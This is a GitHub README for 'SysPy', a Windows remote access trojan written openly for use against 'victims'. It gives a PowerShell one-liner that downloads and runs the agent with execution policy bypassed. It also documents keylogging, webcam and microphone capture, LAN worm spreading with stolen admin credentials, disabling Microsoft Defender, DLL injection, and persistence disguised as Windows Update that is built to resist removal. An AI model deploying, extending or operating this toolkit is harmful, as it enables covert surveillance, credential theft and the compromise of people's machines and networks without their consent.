<div align="center">

# 🦇 SysPy

### A dependency-free remote administration toolkit that fits in one line.

**Drop a single PowerShell command on a Windows box. Get a full remote desktop, shell, file manager, keylogger and LAN-wide spreader in your browser.**

[![Version](https://img.shields.io/badge/version-5.1.0-00d9ff?style=for-the-badge)](https://github.com/xgoat-tbh/Package/commits/main)
[![Python](https://img.shields.io/badge/python-3.8%2B%20%7C%20embedded-3776ab?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Dependencies](https://img.shields.io/badge/dependencies-ZERO-00c853?style=for-the-badge)](https://github.com/xgoat-tbh/Package)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078d4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/xgoat-tbh/Package)
[![License](https://img.shields.io/badge/license-MIT-f5c518?style=for-the-badge)](LICENSE)

<sub>**No pip. No installer. No admin prompt on the victim. No agent binary to compile.**</sub>

</div>

---

## 📖 Table of Contents

| | | |
|---|---|---|
| [✨ Why SysPy](#-why-syspy) | [🏗️ Architecture](#️-architecture) | [🚀 Quick Start](#-quick-start) |
| [💉 The One-Liner](#-the-one-liner) | [🖥️ Dashboard Tour](#️-dashboard-tour) | [⌨️ Command Reference](#️-command-reference) |
| [🌐 LAN Spread](#-lan-spread--tree-mode) | [🕵️ Stealth & Persistence](#️-stealth--persistence) | [🔐 Security Model](#-security-model) |
| [⚙️ Configuration](#️-configuration) | [🧹 Removing It](#-removing-it) | [🔧 Troubleshooting](#-troubleshooting) |
| [📁 Repo Layout](#-repo-layout) | [🗺️ Roadmap](#️-roadmap) | [❓ FAQ](#-faq) |

---

## ✨ Why SysPy

Most RATs make you choose: **easy to deploy** *or* **powerful**. SysPy refuses the tradeoff.

| | |
|---|---|
| 🎯 **One-line install** | `irm … \| iex`. That's the entire deployment. |
| 📦 **Zero dependencies** | The MQTT client, WebSocket server, HTTP router and crypto are all hand-rolled against the Python stdlib. Nothing to `pip install`. |
| 🐍 **No Python needed** | If the victim has no interpreter, the controller serves a private embedded one. |
| 🛡️ **Survives removal** | Four autostart vectors, a WMI consumer, a `SYSTEM` boot task and a watchdog. The victim can't remove it — only you can. |
| 🌐 **LAN-wide spread** | One infected PC becomes ten. Pull and push tiers, tree topology, hop-limited. |
| 🖥️ **Real remote desktop** | Live screen stream, interactive click/type, webcam, microphone. |
| 📂 **Explorer-grade file manager** | Monaco code editor, drag-and-drop upload, ZIP download, recycle bin, search, bookmarks. |
| 📱 **Mobile dashboard** | Full control from a phone. |
| 🔐 **Per-agent encryption** | Encrypt-then-MAC envelope with HKDF-derived per-agent subkeys. |
| 💸 **Free to host** | Runs on Render's free tier. |

> **SysPy is not a toy.** It does what TeamViewer, AnyDesk and a RAT do — combined, in one line, with no footprint in Add/Remove Programs.

---

## 🏗️ Architecture

```
   ┌──────────────┐        ┌──────────────┐        ┌──────────────┐
   │   VICTIM A   │        │   VICTIM B   │        │   VICTIM C   │
   │  pythonw.exe │◄──────►│  pythonw.exe │◄──────►│  pythonw.exe │
   │              │  LAN   │              │  LAN   │              │
   └──────┬───────┘ 8788/9 └──────┬───────┘        └──────┬───────┘
          │                       │                       │
          │        MQTT 3.1.1 over TLS · port 8883        │
          └───────────┬───────────┴───────────┬───────────┘
                      │                       │
              ┌───────▼───────────────────────▼───────┐
              │   🔀  MQTT BROKER  (rendezvous only)  │
              └───────────────────┬───────────────────┘
                                  │
              ┌───────────────────▼───────────────────┐
              │   🎛️  CONTROLLER  (Render / VPS)      │
              │   /wu  ·  /api  ·  /ws  ·  dashboard  │
              └───────────────────┬───────────────────┘
                                  │  HTTPS
                      ┌───────────▼───────────┐
                      │  👤  YOU — any browser │
                      │  laptop · phone · iPad │
                      └───────────────────────┘
```

**Two things worth understanding:**

- **The broker is the rendezvous, not the controller.** Agents talk to the MQTT broker; the controller listens there too. Kill Render and the fleet keeps running and keeps spreading — you only lose the dashboard. That makes the broker the real single point of failure, which is why **self-hosting it is recommended**.
- **Every agent is stdlib-only.** The controller compiles nothing and ships no binary. `agent.py` is plain text on disk — which is precisely why Defender barely notices it.

---

## 🚀 Quick Start

### 1️⃣ Deploy the controller

Fork this repo, then:

[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy)

Or manually — **New → Web Service**, build `pip install -r requirements.txt`, start:

```bash
python controller.py --host 0.0.0.0 --port $PORT
```

### 2️⃣ Set your secrets

> ⚠️ **Do this before your first victim.** The default room and passphrase are public in this repo.

| Variable | Value | Why |
|---|---|---|
| `SYSPY_ROOM` | anything random, e.g. `syspy-kilo-9153` | MQTT topic namespace |
| `SYSPY_PASS` | a strong passphrase | Seeds the master key |
| `SYSPY_URL` | `https://your-app.onrender.com` | Baked into the installer |
| `SYSPY_PASSWORD` | dashboard password | If unset, one is printed to the logs |
| `SYSPY_DATA` | `/var/data` | Persist nicknames + sessions across deploys |
| `SYSPY_BROKER` | *optional* — `your-broker:8883:1` | Recommended; see below |
| `SYSPY_BROKER_USER` / `_PASS` | *optional* | Stops strangers subscribing |

<details>
<summary><b>🔀 About the broker</b></summary>

<br>

SysPy ships with a working default (`broker.emqx.io:8883`) so a fresh install connects immediately. But the public broker is anonymous and shared with thousands of unrelated users.

**Recommended for production:** run your own. A €4 VPS with Mosquitto, or EMQX Cloud:

```
listener 8883
cafile   /etc/mosquitto/certs/ca.crt
certfile /etc/mosquitto/certs/server.crt
keyfile  /etc/mosquitto/certs/server.key
allow_anonymous false
password_file /etc/mosquitto/passwd
```

Then set `SYSPY_BROKER=your-host:8883:1` plus the credentials. A broker that **enforces** credentials is what actually keeps strangers out — `broker.emqx.io` accepts anything.

> ⚠️ List **one** broker. Agents on different brokers cannot see each other unless you run an MQTT bridge.

</details>

### 3️⃣ Infect your first machine

Open your dashboard, click **➕ Add a PC…**, and copy the line. Or read on.

---

## 💉 The One-Liner

Run this in PowerShell on the target. **That's it.**

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://YOUR-APP.onrender.com/wu | iex"
```

<details>
<summary><b>🔧 Variants & options</b></summary>

<br>

**Via `cmd.exe`** — if PowerShell is locked down:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://YOUR-APP.onrender.com/wu | iex"
```

Or point `cmd` straight at the served batch shim:

```
https://YOUR-APP.onrender.com/wu.cmd
```

**With options** — append query parameters:

| Parameter | Default | Effect |
|---|---|---|
| `?protect=0` | `1` | Disable unremovable mode |
| `?elevate=0` | `1` | Skip the UAC prompt |
| `?target=C:\Tools` | auto | Custom install directory |
| `?group=office` | — | Tag the host into a dashboard group |

```powershell
irm "https://YOUR-APP.onrender.com/wu?group=office&protect=1" | iex
```

**Silent, no UAC** — for scripted deployment:

```powershell
irm "https://YOUR-APP.onrender.com/wu?elevate=0" | iex
```

</details>

### What happens on the victim

| Step | Action |
|---|---|
| 1 | Fetches `/wu` — a small PowerShell bootstrapper |
| 2 | Resolves a writable directory (`%LOCALAPPDATA%` → `%TEMP%` fallback) |
| 3 | Downloads `kit.zip` — the whole agent, ~100 KB |
| 4 | If no Python exists, pulls a private embedded interpreter |
| 5 | Extracts atomically, writes `deploy.json` with room/pass/salt |
| 6 | Launches `pythonw.exe agent.py --hidden` — **no console window** |
| 7 | Installs 4 autostart vectors + WMI consumer + watchdog, then locks ACLs |
| 8 | Connects to the broker and appears in your dashboard within seconds |

> ✅ **No reboot. No installer. No admin required** (accept the UAC prompt for full-system persistence).

---

## 🖥️ Dashboard Tour

| Tab | What you get |
|---|---|
| **⌨️ Terminal** | Full CMD / PowerShell / embedded Python. Command history with ↑/↓, tab completion, split-view screen preview. |
| **🖥️ Screen** | Capture at 100% / 50%, live 2-second stream, fullscreen, **interactive click / right-click / type**, save image. |
| **📂 Files** | Explorer-grade. Drives, breadcrumbs, search, drag-drop upload, ZIP download, Monaco editor with conflict detection, recycle bin, properties, bookmarks. |
| **🔑 Keys** | Live keylogger stream. `Start` / `Dump` / `Stop`. |
| **⚙️ System** | CPU, RAM, battery, idle, uptime, active window. Power controls. One-click elevate. |

**Fleet controls**

- 🔍 **Live tree** of every host, with CPU/RAM sparklines and hop depth
- ☑️ **Multi-select** — checkboxes, `all`, or `online only` — then `Run` / `Push` / `Restart` / `Uninstall` / `Purge` / `Rename` across the selection
- ✏️ **Rename** any host (double-click, or bulk with `{host}` / `{n}` patterns)
- 🏷️ **Group** hosts and target by `group:name`
- ✕ **Remove** stale entries from the tree
- 📡 **Broadcast** one command to the entire fleet
- 📱 **Fully responsive** — single-column layout under 820 px, tap-to-click on the screen viewer

---

## ⌨️ Command Reference

Anything unregistered falls through to the shell, so `ipconfig /all`, `whoami`, `netstat -ano` all just work.

<details>
<summary><b>🖥️ System & Identity</b></summary>

```
info · ver · where · ping · elevate · help · installed
startup · proc.list (ps) · proc.kill (kill) · proc.start (start)
net.info (net) · net.wifi (wifi)
reg.read HKCU\Path\Value · reg.write HKCU\Path\Value data
```

</details>

<details>
<summary><b>📂 Filesystem</b></summary>

```
fs.drives · fs.list (ls, dir) · fs.prop · fs.read · fs.save
fs.touch · fs.mkdir · fs.rename · fs.delete (rm) · fs.cpmv
fs.search · fs.cat (cat) · fs.write · fs.find · fs.download (get)
cd · pwd
```

</details>

<details>
<summary><b>🎥 Surveillance</b></summary>

```
shot [25|50|100]     screenshot at a scale factor
burst [n]            n rapid frames
cam                  webcam capture
mic [seconds]        microphone recording → WAV (alias: record)
key start|stop|dump|peek|clear
type <text>          inject keystrokes
mouse move|click|right|double|scroll|clickat x y
clip.get · clip.set <text>
```

</details>

<details>
<summary><b>🎛️ Control</b></summary>

```
cmd <command>        explicit CMD shell
ps1 <script>         PowerShell with ExecutionPolicy Bypass
py <code|file>       embedded Python
eval <expr>          evaluate in the agent's namespace
msg <text> · beep · say <text> · vol mute|up|down
wallpaper <path> · open <path|url>
power.lock|sleep|restart|shutdown
```

</details>

<details>
<summary><b>🕵️ Stealth & Persistence</b></summary>

```
stealth.info · stealth.hide · stealth.show
cloak                hide files + backdate timestamps on all install dirs
persist.status · persist.install · persist.remove · heal
guardian.status · guardian.install
restart.agent · update · rollback
uninstall · purge
```

</details>

<details>
<summary><b>🛡️ Defence & Injection</b></summary>

```
defender off · defender on · defender exclude <path>
inject <pid> <dll-path>
```

**`defender`** uses `Set-MpPreference`, so the `WinDefend` service keeps running — far less suspicious than killing it. Combine with `defender exclude <install-dir>` for effective invisibility.

**`inject`** is real `CreateRemoteThread` + `LoadLibraryA` remote-thread injection. It needs a companion DLL (SysPy doesn't ship one), so pass a path to any x64 DLL.

</details>

<details>
<summary><b>🌐 LAN</b></summary>

```
lan.state · lan.scan · lan.peers
lan.pull <ip> · lan.push <ip> [user] [pass] [domain]
lan.spread [user] [pass] [domain] · lan.refresh
```

</details>

---

## 🌐 LAN Spread & Tree Mode

One machine becomes a network. `lan.spread` walks the local subnet, finds Windows hosts with SMB open, and installs itself on each — **recursively**, up to `SYSPY_HOP_LIMIT` (default 3).

**Two tiers:**

| Tier | Requires | How |
|---|---|---|
| **A — Pull** | nothing | Peer serves `/kit` over HTTP on 8789. Target installs itself. Zero credentials. |
| **B — Push** | local admin creds | `net use` → `xcopy` into `ADMIN$` → `schtasks /run`. |

**Tree topology.** Each agent records its `parent` and `hop`, so the dashboard renders the real LAN shape — a tree, not a flat list. Discovered-but-unmanaged hosts appear as dimmed *ghost* nodes so you can see reach before you commit.

```powershell
# from the dashboard terminal, on any infected host
lan.spread DOMAIN\admin Hunter2
```

> 💡 Credential-free spread works on any Windows box where the current user's token is accepted. Use Tier B when you have domain admin.

---

## 🕵️ Stealth & Persistence

### How it hides

| Technique | Detail |
|---|---|
| 🪟 **No console** | Runs under `pythonw.exe`, window hidden |
| 📛 **Camouflage** | Named `WindowsUpdateService` — task, registry values, description |
| 📁 **Believable paths** | `%LOCALAPPDATA%\Microsoft\WindowsUpdate`, `%APPDATA%\Microsoft\WindowsUpdate`, `%PROGRAMDATA%\Microsoft\WindowsUpdate`, and `%LOCALAPPDATA%\Microsoft\EdgeUpdate` |
| 🔒 **Hidden + System** | `cloak` sets file attributes and backdates timestamps to blend in |
| 🧬 **No binary** | Plain `.py` on disk. No PyInstaller bootloader for Defender to flag. |

### How it survives

Seven independent mechanisms, re-asserted every 30 seconds:

1. `HKCU\...\Run\WindowsUpdateService` → **anchor** shim
2. `HKCU\...\Run\WindowsUpdateServiceBoot` → **primary** shim
3. `HKLM\...\Run\WindowsUpdateService` *(admin)*
4. Startup folder `.cmd` launcher
5. Scheduled task `WindowsUpdateService` — `ONLOGON`, repeating every 5 min
6. Scheduled task `WindowsUpdateServiceBoot` — `ONSTART` as `SYSTEM`
7. **WMI consumer** in `root\subscription` — no file, no service, no shortcut

The two `Run` values deliberately point at **different copies**, so deleting either directory still leaves a working autostart.

Plus: a **watchdog twin** that restarts the agent if killed, a **`%PROGRAMDATA%` anchor** that survives a profile wipe, a self-rebuilding `wu.cmd` shim, a cached `kit.zip`, and **StartupApproved blob rewrites** so Task Manager's *Disable* button doesn't stick.

### ACL hardening

`install()` locks the install directories with `icacls`, using an **asymmetric** policy:

| Directory | Standard Users | Why |
|---|---|---|
| `%LOCALAPPDATA%\Microsoft\WindowsUpdate` | **Modify** | The agent must be able to rewrite itself while unelevated |
| `%PROGRAMDATA%\Microsoft\WindowsUpdate` | **Read + Execute** | The locked resurrection source — users cannot delete it |

Result: a standard user cannot remove the agent, but the agent can still self-heal.

> 🔁 Delete every folder, kill every process — the WMI consumer rebuilds the install from cache within 5 minutes.

---

## 🔐 Security Model

**Envelope:** `nonce(8) ‖ ciphertext(n) ‖ tag(32)` — encrypt-then-MAC.

| Layer | Construction |
|---|---|
| Master key | PBKDF2-HMAC-SHA-256, 60 000 iterations |
| **Per-agent key** | **HKDF-Expand (RFC 5869) over HMAC-SHA-256, keyed on the agent ID** |
| Keystream | SHA-256 in counter mode |
| Authenticator | HMAC-SHA-256 over `nonce ‖ ciphertext`, constant-time compare |
| Replay defence | Sliding nonce filter |
| Transport | MQTT 3.1.1 over **TLS 1.2+ with system CA verification** |
| Dashboard | Bearer tokens + per-IP login rate limiting (HTTP 429) |

**Why per-agent keys matter:** one shared passphrase would mean one compromised agent reveals the whole fleet's traffic. Deriving a distinct subkey per agent ID means an attacker who recovers one key still can't read the others. The controller keeps a codec cache and falls back to the master codec for unmigrated agents.

<details>
<summary><b>⚠️ Threat model — read this before trusting it</b></summary>

<br>

| Adversary | Outcome |
|---|---|
| **Casual user** | Loses. Returns within 5 minutes. |
| **User with Autoruns** | Full detection — everything is visible, just boringly named. |
| **Anyone with this repo** | On default creds, reads and writes your C2. **Change `SYSPY_ROOM` and `SYSPY_PASS`.** |
| **Anyone on the LAN** | Can read the room name from a beacon packet. |
| **Broker outage** | Fleet survives. Only the dashboard and new installs stop. |
| **Administrator** | Always wins. `takeown` + `icacls /reset` removes anything. |

This is **not** a rootkit. There is no SSDT hooking, no process injection of the agent itself. What it avoids is the thing that actually gets flagged: a signed-exe-shaped binary with a PyInstaller bootloader.

**Hardening checklist:**

- ✅ Change `SYSPY_ROOM` and `SYSPY_PASS` from defaults
- ✅ Self-host the broker with `allow_anonymous false`
- ✅ Set `SYSPY_BROKER_USER` / `_PASS`
- ✅ Set `SYSPY_DATA` to a persistent disk so nicknames and sessions survive redeploys
- ⬜ Code-sign the exe if you build one

</details>

---

## ⚙️ Configuration

<details>
<summary><b>All environment variables</b></summary>

<br>

**Identity & secrets**

| Variable | Default | Notes |
|---|---|---|
| `SYSPY_ROOM` | `syspy-delta-7421` | **Change it.** MQTT topic prefix. |
| `SYSPY_PASS` | `k9Xq2-venice-syspy` | **Change it.** Seeds the master key. |
| `SYSPY_PASSWORD` | random | Dashboard password |
| `SYSPY_GROUP` | — | Default group tag |

**Transport**

| Variable | Default | Notes |
|---|---|---|
| `SYSPY_BROKER` | — | `host:port:tls` — overrides the built-in default |
| `SYSPY_BROKER_USER` | — | MQTT username |
| `SYSPY_BROKER_PASS` | — | MQTT password |
| `SYSPY_CLIENT_ID` | derived | A fixed value is guessable; MQTT evicts on collision |

**Server**

| Variable | Default | Notes |
|---|---|---|
| `SYSPY_HOST` | `127.0.0.1` | Bind address |
| `SYSPY_URL` | — | Public URL, baked into the installer |
| `SYSPY_DATA` | `<root>/data` | Persistent state directory |

**Agent behaviour**

| Variable | Default | Notes |
|---|---|---|
| `SYSPY_LAN` | `1` | LAN discovery |
| `SYSPY_SPREAD` | `1` | Auto-spread |
| `SYSPY_HOP_LIMIT` | `3` | Max spread depth |
| `SYSPY_LAN_PORT` | `8788` | UDP beacon |
| `SYSPY_KIT_PORT` | `8789` | HTTP kit server |
| `SYSPY_NO_UAC` | — | Suppress elevation |
| `SYSPY_NO_WATCHDOG` | — | Disable the watchdog twin |
| `SYSPY_DEPLOY` | auto | Path to `deploy.json` |

</details>

---

## 🧹 Removing It

| Command | Effect |
|---|---|
| `uninstall` | **Soft.** Autostart vectors stay registered. Agent returns within 5 min. |
| `purge` | **Hard.** Everything gone — tasks, keys, WMI, anchor, runtime. |
| `agent.py --uninstall` | Soft, from the CLI |
| `agent.py --purge` | Hard, from the CLI |

Protected installs (`?protect=1`, the default) keep their autostart vectors on `uninstall`, so the agent walks back in. Use `purge` to be rid of it for good.

> 🧑💻 **For the victim:** `agent.py --purge` needs admin. The WMI consumer and the `HKLM` value require elevation.

---

## 🔧 Troubleshooting

<details>
<summary><b>🚨 Agent installs but never appears in the dashboard</b></summary>

<br>

Work down this list in order:

1. **Does `SYSPY_BROKER` resolve?** If you set it, confirm `host:port:tls` is correct — a malformed value silently falls back.
2. **Does `SYSPY_ROOM` match on both sides?** A mismatch means the agent publishes to a topic nobody is reading.
3. **Does `SYSPY_PASS` match?** A mismatch means the controller can't decrypt `hello` and drops it without complaint.
4. **Is the broker reachable from the victim?** Corporate networks block 8883 surprisingly often.
5. On the victim: `python agent.py --check` prints the resolved paths and elevation state.

</details>

<details>
<summary><b>Install line does nothing</b></summary>

<br>

- Execution policy → the line already passes `-ExecutionPolicy Bypass`
- Behind a proxy → `irm` needs `-Proxy`
- Confirm `/wu` resolves: `curl https://your-app.onrender.com/wu`
- Render's free tier **sleeps after 15 minutes**. The first request can be slow enough to time out — warm it up first, or move to `plan: starter`.

</details>

<details>
<summary><b>Dashboard shows every agent offline, but they're alive</b></summary>

<br>

The relay dropped — usually Render sleeping, or a broker disconnect. The agents are fine; they reappear within a heartbeat once the controller is back.

If it's persistent, someone may be evicting your session: MQTT disconnects the older client on a duplicate client ID. Use a non-obvious `SYSPY_CLIENT_ID`.

</details>

<details>
<summary><b>Pushing an update gets rejected</b></summary>

<br>

The agent refuses updates from a controller advertising a newer protocol. Update messages currently carry `proto = 1` for compatibility; agents accept up to `2`. If you bump one side, bump both.

</details>

<details>
<summary><b>Screen capture is black</b></summary>

<br>

The agent is on a locked desktop or in session 0. The capture path calls `OpenInputDesktop` + `SetThreadDesktop`; a locked desktop yields a blank surface. Unlock and retry.

</details>

<details>
<summary><b>Webcam fails</b></summary>

<br>

It needs OpenCV. With `AUTO_INSTALL_DEPS=1` the agent `pip install`s it on first use — expect a delay and a visible network event the first time. Microphone capture (`mic`) needs nothing extra; it uses `winmm` directly.

</details>

---

## 📁 Repo Layout

```
agent.py                  victim-side entry point
controller.py             controller entry point
bootstrap.py              installer (staging → atomic swap)

syspy/
  config.py               all configuration
  crypto.py               encrypt-then-MAC envelope + HKDF subkeys
  protocol.py             framing, chunking, reassembly
  mqtt.py                 hand-rolled MQTT 3.1.1 client
  httpd.py                hand-rolled HTTP router
  ws.py                   hand-rolled WebSocket server
  guardian.py             WMI consumer + StartupApproved
  packaging.py            zip builder
  agent/                  the payload
    core.py               lifecycle + transport loop
    commands.py           command registry (~85 commands)
    persistence.py        autostart vectors + ACL hardening
    stealth.py            naming, hiding, single-instance
    inputs.py             keyboard, mouse, clipboard, keylogger
    screen.py             GDI capture
    files.py              filesystem operations
    audio.py              microphone capture (winmm)
    inject.py             CreateRemoteThread DLL injection
    defender.py           Defender control
    cloak.py              attribute + timestamp masking
    lan/                  beacon, discovery, spread
  server/
    api.py                routes + websocket + rate limiting
    hub.py                agent registry, per-agent codecs, tree, outbox
    webinstall.py         the /wu installer
    static/               dashboard (HTML/CSS/JS + mobile.css)

install/                  wu.cmd, wu.vbs, i.ps1
scripts/                  hardening.ps1
tools/                    preflight, smoke tests, audit checks
```

---

## 🗺️ Roadmap

- [x] One-line install
- [x] Encrypted C2 with replay protection
- [x] Four-vector persistence + WMI resurrection
- [x] LAN spread with tree topology
- [x] Interactive remote desktop
- [x] Explorer-grade file manager + Monaco
- [x] Multi-select fleet commands
- [x] Mobile-responsive dashboard
- [x] Per-agent key derivation (HKDF)
- [x] Broker authentication support
- [x] ACL hardening against user removal
- [ ] Code-signed companion DLL for zero-config injection
- [ ] DNS / HTTPS fallback C2 for 8883-blocked networks
- [ ] macOS / Linux agent parity

---

## ❓ FAQ

<details>
<summary><b>Do I need Python on the victim?</b></summary>

<br>

No. The controller serves a private embedded interpreter if none is found.
</details>

<details>
<summary><b>Does it need admin?</b></summary>

<br>

Not to run. Admin unlocks `HKLM` persistence, the `SYSTEM` boot task, the WMI consumer and ACL hardening — so it's strongly recommended.
</details>

<details>
<summary><b>Will it show in Add/Remove Programs?</b></summary>

<br>

No. There's no installer and no MSI entry.
</details>

<details>
<summary><b>Is it detectable?</b></summary>

<br>

Yes, if you look. It's *blending*, not rootkit-grade hiding — Autoruns shows all seven vectors. What it avoids is the thing that actually gets flagged: a signed-exe-shaped binary with a PyInstaller bootloader.
</details>

<details>
<summary><b>Why is the code so weird? No paho, no Flask?</b></summary>

<br>

Because the agent must run where nothing is installed. Every dependency is a thing that can fail on a locked-down corporate machine. Hand-rolling ~1 500 lines of protocol costs less than one broken deployment.
</details>

<details>
<summary><b>Can it survive a reboot?</b></summary>

<br>

Yes — Run keys, scheduled tasks and the Startup folder all fire at logon, and the `SYSTEM` task fires at boot.
</details>

<details>
<summary><b>Is the crypto audited?</b></summary>

<br>

No. It's a small, readable encrypt-then-MAC construction built from `hashlib` alone. It is not AES-GCM and has had no formal review. For the threat model — a semi-public broker — it is sound and the design is standard.
</details>

---

<div align="center">

### 🦇 Built to be forgotten about.

**Star it if it saved you a TeamViewer licence.**

<sub>MIT Licensed · v5.1.0 · Made for people who like boring reliability and interesting capability.</sub>

</div>
